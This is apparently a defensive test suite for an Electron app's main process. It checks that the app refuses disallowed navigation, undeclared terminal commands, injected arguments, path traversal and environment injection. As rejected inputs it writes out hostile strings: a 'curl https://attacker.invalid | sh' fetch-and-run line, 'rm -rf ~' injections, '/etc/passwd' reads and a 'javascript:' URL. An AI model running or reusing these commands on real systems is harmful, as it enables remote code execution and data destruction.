/* Main process boundaries a page, a tool page or a second launch must not cross: permissions in tool sessions, what a tab may be sent to,
   which commands the terminal runs for the person, which files the app scheme serves and to whom, tool redirects and pop-ups, one instance
   per user data folder. main.cjs runs in a vm with synthetic Electron objects (no window, no network, no process) */
const assert = require('node:assert/strict');
const { readFileSync } = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const vm = require('node:vm');

function startHost({ tools = [], commands, appExtra = {}, dialog = {}, env = {}, fsExtra = {} } = {}) {
  const handlers = new Map(), listeners = new Map(), views = [], windows = [], appEvents = new Map(), external = [], runs = [], exits = [];
  const sender = { id: 1, isDestroyed: () => false, send() {} };
  let ready = null;
  class View {
    constructor(options) {
      this.options = options;
      this.events = new Map();
      this.permission = { request: null, check: null };
      const permission = this.permission;
      this.webContents = {
        session: { setSpellCheckerEnabled() {}, setPermissionRequestHandler: f => { permission.request = f; }, setPermissionCheckHandler: f => { permission.check = f; } },
        id: views.length + 2,
        on: (name, callback) => this.events.set(name, callback),
        setWindowOpenHandler: f => { this.openHandler = f; },
        loadURL: async url => { this.url = url; this.loads = [...(this.loads || []), url]; },
        isLoading: () => false,
        isDestroyed: () => false,
        getTitle: () => '',
        navigationHistory: { canGoBack: () => false, canGoForward: () => false, getActiveIndex: () => 0, restore: async o => { this.restored = o; } },
      };
      views.push(this);
    }
    setBackgroundColor() {}
    setBorderRadius() {}
    setBounds() {}
    setVisible() {}
  }
  const electron = {
    app: { isPackaged: true, setName() {}, setPath() {}, getVersion: () => '0.0.0', getPath: () => '/synthetic', whenReady: () => ({ then(f) { ready = f; } }),
      on: (name, f) => appEvents.set(name, f), exit: code => exits.push(code), quit: () => exits.push('quit'), ...appExtra },
    WebContentsView: View,
    ipcMain: { handle: (name, callback) => handlers.set(name, callback), on: (name, callback) => listeners.set(name, callback) },
    protocol: { registerSchemesAsPrivileged() {} },
    nativeTheme: { shouldUseDarkColors: false },
    shell: { openExternal: url => external.push(url) },
    dialog,
  };
  const dependencies = {
    electron,
    'node:path': path,
    'node:fs': { readFileSync() { throw new Error('no synthetic preferences'); }, ...fsExtra },
    'node:url': { pathToFileURL() { throw new Error('unexpected file URL'); } },
    'node:os': { homedir: () => '/synthetic', userInfo: () => ({ homedir: '/synthetic' }) },
    'node:child_process': { execFile() { throw new Error('unexpected system execution'); } },
    'node:crypto': require('node:crypto'),
    './tool-auth.cjs': require('./tool-auth.cjs'),
    './menu.cjs': {},
    './named-bundle.cjs': { relaunchNamed: () => Promise.resolve(false) },
    './background-run.cjs': require('./background-run.cjs'), '../core/live.js': require('../core/live.js'), './native.cjs': {},
    './platform/index.cjs': { capabilities: () => ({ translucent: false }) },
    './terminal.cjs': { create: () => ({ run: (input, owner) => { runs.push(input); return { id: input.id, mode: 'local' }; } }) },
    './updater.cjs': { createUpdater: () => ({ methods: {} }), UPDATE_METHODS: [] },
    './terminal-appearance.cjs': {},
  };
  const context = {
    module: { exports: {} }, __dirname, process: { platform: 'linux', env }, URL, Date, setTimeout() {}, clearTimeout() {},
    Set: class extends Set { constructor(...args) { super(...args); windows.push(this); } },
    require(name) {
      assert.ok(Object.hasOwn(dependencies, name), `unexpected dependency: ${name}`);
      return dependencies[name];
    },
  };
  vm.runInNewContext(readFileSync(path.join(__dirname, 'main.cjs'), 'utf8'), context, { filename: path.join(__dirname, 'main.cjs') });
  context.module.exports.start({ appId: 'sample', name: 'Sample', scheme: 'sample', tools, commands, window: { translucent: false } }, { appRoot: __dirname, repoRoot: path.join(__dirname, '..') });
  const W = { shellView: { webContents: sender }, tabs: new Map(), panes: [], radius: 0, menuState: {}, win: { contentView: { addChildView() {}, removeChildView() {} } } };
  windows[0].add(W);
  return { W, sender, views, external, runs, exits, appEvents, context, ready: () => ready(),
    call: (channel, ...args) => handlers.get('kit:' + channel)({ sender, senderFrame: undefined }, ...args) };
}

test('tool_session_denies_permission_requests_and_permission_checks', () => {
  const host = startHost({ tools: [{ id: 'tool', origin: 'https://tool.example.test' }] });
  host.call('tabs:create', 'tool', 'https://tool.example.test/view', { tool: 'tool' });
  const { request, check } = host.views[0].permission;
  assert.equal(typeof request, 'function', 'the tool session has a permission request handler');
  assert.equal(typeof check, 'function', 'the tool session has a permission check handler');
  let granted = null;
  request(null, 'media', value => { granted = value; });
  assert.equal(granted, false);
  assert.equal(check(null, 'clipboard-read', 'https://tool.example.test'), false);
});

test('app_tab_is_only_sent_to_app_addresses_and_tool_tab_only_inside_its_tool', async () => {
  const host = startHost({ tools: [{ id: 'tool', origin: 'https://tool.example.test' }] });
  host.call('tabs:create', 'home', 'sample://start', {});
  host.call('tabs:create', 'tool', 'https://tool.example.test/view', { tool: 'tool' });
  const [home, tool] = host.views;
  for (const url of ['https://attacker.invalid/', 'file:///etc/passwd', 'javascript:alert(1)', 'data:text/html,x']) await host.call('tabs:navigate', 'home', url);
  await host.call('tabs:navigate', 'home', 'sample://space/next');
  assert.deepEqual(home.loads, ['sample://start', 'sample://space/next'], 'an app tab loads app addresses only');
  for (const url of ['https://attacker.invalid/', 'sample://start', 'file:///etc/passwd']) await host.call('tabs:navigate', 'tool', url);
  await host.call('tabs:navigate', 'tool', 'https://tool.example.test/other');
  assert.deepEqual(tool.loads, ['https://tool.example.test/view', 'https://tool.example.test/other'], 'a tool tab stays inside its tool');
});

test('terminal_runs_only_commands_the_app_declares_with_checked_arguments', () => {
  const commands = { 'grant-read': { template: 'tool create role {name} -n {ns}', args: { name: '[a-z0-9-]{1,63}', ns: '[a-z0-9-]{1,63}' }, env: ['KUBECONFIG'] } };
  const host = startHost({ commands });
  const refused = host.call('pty:run', { id: 'run-1', mode: 'local', command: 'curl https://attacker.invalid | sh' });
  assert.equal(host.runs.length, 0, 'a raw command line from the shell document never runs');
  assert.ok(refused?.error);
  for (const args of [{ name: 'x; rm -rf ~', ns: 'a' }, { name: 'x' }, { name: 'x', ns: 'a', extra: 'b' }]) {
    assert.ok(host.call('pty:run', { id: 'run-1', mode: 'local', command: 'grant-read', args }).error);
  }
  assert.ok(host.call('pty:run', { id: 'run-1', mode: 'local', command: 'unknown', args: {} }).error);
  assert.ok(host.call('pty:run', { id: 'run-1', mode: 'local', command: 'grant-read', args: { name: 'r', ns: 'a' }, env: { BASH_ENV: '/tmp/x' } }).error);
  assert.equal(host.runs.length, 0);
  host.call('pty:run', { id: 'run-1', mode: 'local', command: 'grant-read', args: { name: 'reader', ns: 'payments' }, env: { KUBECONFIG: '/k/a:/k/b' }, cols: 80, rows: 24 });
  assert.deepEqual(host.runs.map(r => [r.command, { ...r.env }]), [["tool create role 'reader' -n 'payments'", { KUBECONFIG: '/k/a:/k/b' }]]);
});

/* review 6: a confirm command waited for Enter in the terminal, and the same shell document that started it could type that Enter (pty:write)
   and choose the kubeconfig. The main process now shows its own OS dialog with the command line and the environment it will run with; only
   the person's press on the run button starts it, and what the page typed or sent as words changes nothing */
test('a_declared_command_that_writes_elsewhere_runs_only_after_the_main_process_native_confirmation', async () => {
  const commands = { 'write-mark': { template: 'touch {file}', args: { file: '/[^\\u0000-\\u001f\\u007f]{1,1024}' }, env: ['KUBECONFIG'], confirm: true }, 'read-only': { template: 'true' } };
  const asked = [];
  let answer = 0;
  const host = startHost({ commands, dialog: { showMessageBox: async (...a) => { asked.push(a.at(-1)); return { response: answer }; } } });
  assert.equal(host.call('pty:run', { id: 'run-2', mode: 'local', command: 'read-only', args: {} }).id, 'run-2', 'a command that is not marked runs as declared');
  const cancelled = await host.call('pty:run', { id: 'run-1', mode: 'local', command: 'write-mark', args: { file: '/x/mark' }, env: { KUBECONFIG: '/page/config' }, confirmText: 'Enter: run' });
  assert.equal(cancelled.code, 'TERMINAL_COMMAND_CANCELLED');
  assert.deepEqual(host.runs.map(r => r.command), ['true'], 'nothing ran before the person pressed run in the dialog');
  assert.equal(asked.length, 1);
  assert.equal(asked[0].cancelId, 0); assert.equal(asked[0].defaultId, 0, 'the default answer is cancel'); assert.equal(asked[0].buttons[0], 'confirm.cancel', 'cancel is the first, focused button');
  assert.match(asked[0].detail, /touch '\/x\/mark'/, 'the dialog shows the exact command line');
  assert.match(asked[0].detail, /KUBECONFIG=\/page\/config/, 'and the environment it runs with');
  answer = 1;
  await host.call('pty:run', { id: 'run-3', mode: 'local', command: 'write-mark', args: { file: '/x/mark' }, env: { KUBECONFIG: '/page/config' } });
  assert.deepEqual(host.runs.at(-1).command, "touch '/x/mark'", 'the confirmed command runs as declared, with no prompt left for the page to answer');
  /* the app guard resolves an environment name in the main process: it replaces what the page sent, and the dialog shows that value */
  const built = host.context.buildCommand(commands, { command: 'write-mark', args: { file: '/x/mark' }, env: { KUBECONFIG: '/page/config' } }, () => ({ env: { KUBECONFIG: '/main/config' } }));
  assert.deepEqual({ ...built.env }, { KUBECONFIG: '/main/config' });
  assert.equal(built.confirm, true);
  assert.equal(host.context.buildCommand(commands, { command: 'write-mark', args: { file: '/x/mark' } }, () => ({ env: { BASH_ENV: '/x' } })), null, 'a guard cannot add an undeclared name');
  assert.match(readFileSync(path.join(__dirname, 'main.cjs'), 'utf8'), /\[built\.detail \? words\(built\.detail\) : '', built\.command, envLines\(built\.env\)\]/, 'the dialog shows the environment the command runs with');
});

test('app_scheme_serves_only_kit_and_apps_files_and_answers_cors_only_to_app_origins', () => {
  const host = startHost();
  const repo = path.join(__dirname, '..');
  const { servedFile, corsOrigin } = host.context;
  assert.equal(typeof servedFile, 'function', 'servedFile');
  assert.equal(servedFile(repo, '/kit/core/live.js'), path.join(repo, 'kit/core/live.js'));
  assert.equal(servedFile(repo, '/apps/sample/index.html'), path.join(repo, 'apps/sample/index.html'));
  for (const rel of ['/spec/rules.md', '/.local/banned-names.txt', '/.git/config', '/AGENTS.md', '/kit/../spec/rules.md', '/%2e%2e/etc/passwd', '/kitx/a.js', '/kit']) {
    assert.equal(servedFile(repo, rel), null, rel);
  }
  assert.equal(corsOrigin('sample', 'sample://space'), 'sample://space');
  for (const origin of [null, '', 'null', 'https://attacker.invalid', 'sample://a/b', 'samplex://space']) assert.equal(corsOrigin('sample', origin), null, String(origin));
});

test('tool_redirect_is_checked_like_navigation_and_a_pop_up_opens_outside_only_after_a_person_acts', () => {
  const host = startHost({ tools: [{ id: 'tool', origin: 'https://tool.example.test' }] });
  host.call('tabs:create', 'tool', 'https://tool.example.test/view', { tool: 'tool' });
  const tool = host.views[0];
  const redirect = tool.events.get('will-redirect');
  assert.equal(typeof redirect, 'function', 'a tool tab checks redirects');
  const outcome = url => { let prevented = false; redirect({ preventDefault() { prevented = true; } }, url, false, true); return prevented; };
  assert.equal(outcome('https://tool.example.test/login'), false);
  assert.equal(outcome('https://attacker.invalid/'), true);
  assert.equal(outcome('sample://start'), true);
  assert.equal(host.external.length, 0, 'a server redirect never opens the outside browser');
  assert.equal(tool.openHandler({ url: 'https://docs.example.test/' }).action, 'deny');
  assert.equal(host.external.length, 0, 'a pop-up without a person acting does not open outside');
  tool.events.get('input-event')({}, { type: 'mouseDown' });
  assert.equal(tool.openHandler({ url: 'https://docs.example.test/' }).action, 'deny');
  assert.deepEqual(host.external, ['https://docs.example.test/']);
});

test('a_second_launch_with_the_same_user_data_quits_and_focuses_the_first_window', async () => {
  const second = startHost({ appExtra: { requestSingleInstanceLock: () => false } });
  await second.ready().catch(() => {});
  assert.deepEqual(second.exits, [0], 'the second instance exits');
  const first = startHost({ appExtra: { requestSingleInstanceLock: () => true } });
  await first.ready().catch(() => {});
  assert.deepEqual(first.exits, []);
  const shown = [];
  Object.assign(first.W.win, { isMinimized: () => true, restore: () => shown.push('restore'), setOpacity() {}, show: () => shown.push('show'), focus: () => shown.push('focus') });
  first.appEvents.get('second-instance')?.();
  assert.deepEqual(shown, ['restore', 'show', 'focus']);
});

/* B2-01: a well-formed declared command ran whatever the app's main process knew about it (an agent chart with no published image). The app's
   commandGuard hook refuses it with its code before anything runs */
test('a_declared_command_the_app_guard_refuses_never_runs', () => {
  const commands = { 'install-x': { template: 'helm install {chart}', args: { chart: '/[a-z/]{1,64}' } } };
  const host = startHost({ commands });
  const built = host.context.buildCommand(commands, { command: 'install-x', args: { chart: '/charts/x' } }, (id, args) => (id === 'install-x' && args.chart === '/charts/x' ? 'IMAGE_UNPUBLISHED' : null));
  assert.equal(built.refused, 'IMAGE_UNPUBLISHED'); assert.equal(built.command, undefined);
  const plain = host.context.buildCommand(commands, { command: 'install-x', args: { chart: '/charts/y' } }, () => null);
  assert.equal(plain.command, "helm install '/charts/y'");
  assert.match(readFileSync(path.join(__dirname, 'main.cjs'), 'utf8'), /buildCommand\(cfg\.commands, o, hooks\.commandGuard\)/, 'pty:run asks the app guard');
});

/* B2-05: a reopened tab (⇧⌘T) got a new view with only its current page, so back showed an empty body. The view comes back with the tab's
   own app pages and position; an outside address or a list that does not hold the current page loads only that page */
test('a_reopened_app_tab_view_comes_back_with_its_history', () => {
  const host = startHost();
  host.call('tabs:create', 'again', 'sample://b', { history: { entries: ['sample://a', 'sample://b'], index: 1 } });
  assert.deepEqual(JSON.parse(JSON.stringify(host.views[0].restored)), { index: 1, entries: [{ url: 'sample://a', title: '' }, { url: 'sample://b', title: '' }] });
  assert.equal(host.views[0].loads, undefined, 'restored, not loaded as a single page');
  host.call('tabs:create', 'odd', 'sample://b', { history: { entries: ['https://attacker.invalid/', 'sample://b'], index: 1 } });
  assert.equal(host.views[1].restored, undefined);
  assert.deepEqual(host.views[1].loads, ['sample://b']);
});

/* a review run of a development build never puts the OS confirmation in front of the person: with KIT_BACKGROUND=1 and KIT_CONFIRM_LOG it
   writes what the dialog would show and answers from <log>.answer (cancel without one); a packaged app or a normal run always shows the dialog */
test('a_background_review_run_records_the_confirmation_instead_of_showing_it_and_cancels_without_an_answer', async () => {
  const commands = { 'write-mark': { template: 'touch {file}', args: { file: '/[a-z/]{1,64}' }, confirm: true } };
  const written = [], files = {}, shown = [];
  const fsExtra = { appendFileSync: (file, text) => written.push([file, text]), readFileSync: file => { if (file in files) return files[file]; throw new Error('no file'); } };
  const before = process.env.KIT_BACKGROUND; process.env.KIT_BACKGROUND = '1';
  try {
    const host = startHost({ commands, env: { KIT_CONFIRM_LOG: '/log/confirm.jsonl', KIT_DEBUG: '0' }, fsExtra, appExtra: { isPackaged: false }, dialog: { showMessageBox: async () => { shown.push(1); return { response: 0 }; } } });
    assert.equal((await host.call('pty:run', { id: 'r1', mode: 'local', command: 'write-mark', args: { file: '/x' } })).code, 'TERMINAL_COMMAND_CANCELLED');
    files['/log/confirm.jsonl.answer'] = 'run\n';
    await host.call('pty:run', { id: 'r2', mode: 'local', command: 'write-mark', args: { file: '/x' } });
    assert.deepEqual(host.runs.map(r => r.command), ["touch '/x'"]);
    assert.equal(shown.length, 0, 'no OS dialog in a review run');
    assert.equal(written.length, 2);
    assert.match(JSON.parse(written[0][1]).detail, /touch '\/x'/);
    const packaged = startHost({ commands, env: { KIT_CONFIRM_LOG: '/log/confirm.jsonl' }, fsExtra, dialog: { showMessageBox: async () => { shown.push(1); return { response: 0 }; } } });
    await packaged.call('pty:run', { id: 'r3', mode: 'local', command: 'write-mark', args: { file: '/x' } });
    assert.equal(shown.length, 1, 'a packaged app always asks in the OS dialog');
  } finally { if (before === undefined) delete process.env.KIT_BACKGROUND; else process.env.KIT_BACKGROUND = before; }
});

/* recheck 2: the app guard may hand the main process what it resolved for this run: argument values (still checked against their patterns), the
   program's absolute path, words for the dialog and a cleanup. The dialog shows them, the command runs with them, and the cleanup runs when the
   command ends or is cancelled */
test('a_guard_resolves_arguments_program_and_dialog_words_and_its_cleanup_runs_after_the_command_or_a_cancel', async () => {
  const commands = { 'install-x': { template: 'helm install {chart}', args: { chart: '/[a-z/]{1,64}' }, env: ['KUBECONFIG'], confirm: true } };
  const host = startHost({ commands });
  let cleaned = 0;
  const guard = () => ({ env: { KUBECONFIG: '/main/one' }, args: { chart: '/main/snapshot' }, program: '/opt/bin/helm', detail: { $t: 'k', vars: {} }, cleanup: () => { cleaned++; } });
  const built = host.context.buildCommand(commands, { command: 'install-x', args: { chart: '/page/chart' }, env: { KUBECONFIG: '/page/config' } }, guard);
  assert.equal(built.command, "'/opt/bin/helm' install '/main/snapshot'");
  assert.deepEqual({ ...built.env }, { KUBECONFIG: '/main/one' });
  assert.equal(typeof built.cleanup, 'function');
  assert.equal(host.context.buildCommand(commands, { command: 'install-x', args: { chart: '/page/chart' } }, () => ({ args: { chart: 'relative; rm -rf ~' }, cleanup: () => { cleaned++; } })), null, 'resolved values still match their patterns');
  assert.equal(cleaned, 1, 'a refused resolution is cleaned up');
  assert.equal(host.context.buildCommand(commands, { command: 'install-x', args: { chart: '/page/chart' } }, () => ({ program: 'helm' })), null, 'the program must be an absolute path');
  const src = readFileSync(path.join(__dirname, 'main.cjs'), 'utf8');
  assert.match(src, /built\.cleanup\?\.\(\)/, 'pty:run cleans up a cancelled or refused run');
  assert.match(src, /onExit: built\.cleanup/, 'and hands the cleanup to the run for its exit');
});

/* round 3 finding 1: the confirmed command ran in a login shell, so a HELM_KUBEAPISERVER or HELM_KUBETOKEN left in the person's startup files
   overrode the confirmed kubeconfig. A guard may ask for an isolated environment: the command runs under env -i with only the declared names
   it resolved and a fixed PATH and HOME */
test('a_guard_can_run_its_command_with_only_an_allowlisted_environment', () => {
  const commands = { 'install-x': { template: 'helm install {chart}', args: { chart: '/[a-z/]{1,64}' }, env: ['KUBECONFIG'], confirm: true } };
  const host = startHost({ commands });
  const built = host.context.buildCommand(commands, { command: 'install-x', args: { chart: '/page/chart' }, env: { KUBECONFIG: '/page/config' } },
    () => ({ env: { KUBECONFIG: '/main/one' }, program: '/opt/bin/helm', isolate: true }));
  assert.equal(built.command, "/usr/bin/env -i 'PATH=/usr/bin:/bin' 'HOME=/synthetic' 'KUBECONFIG=/main/one' '/opt/bin/helm' install '/page/chart'");
  const open = host.context.buildCommand(commands, { command: 'install-x', args: { chart: '/page/chart' } }, () => ({ program: '/opt/bin/helm' }));
  assert.doesNotMatch(open.command, /env -i/, 'without isolate the command keeps the shell environment');
});
